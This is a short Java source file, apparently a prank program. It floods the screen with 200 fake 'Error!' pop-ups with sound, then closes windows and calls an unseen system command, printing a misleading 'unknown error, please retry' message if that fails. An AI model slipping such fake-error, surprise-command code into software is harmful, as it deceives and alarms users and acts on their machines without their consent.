import javax.swing.*;
import java.awt.event.ActionEvent;

public class Surprise {
    public static int errorCount = 0;
    public static Timer timer;

    public static void surprise() {
        timer = new Timer(200, new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (errorCount < 200) {
                    ErrorWindow.window("Error!", false);
                    PlayAudio.player();
                    errorCount++;
                } else {
                    timer.stop();
                    try {
                        WindowsCloser.closer();
                        SystemCommand.command();
                    } catch (Exception e1) {
                        System.out.print("未知错误，请重试");
                    }
                }
            }
        });
        timer.setRepeats(true);
        timer.start();

    }
}
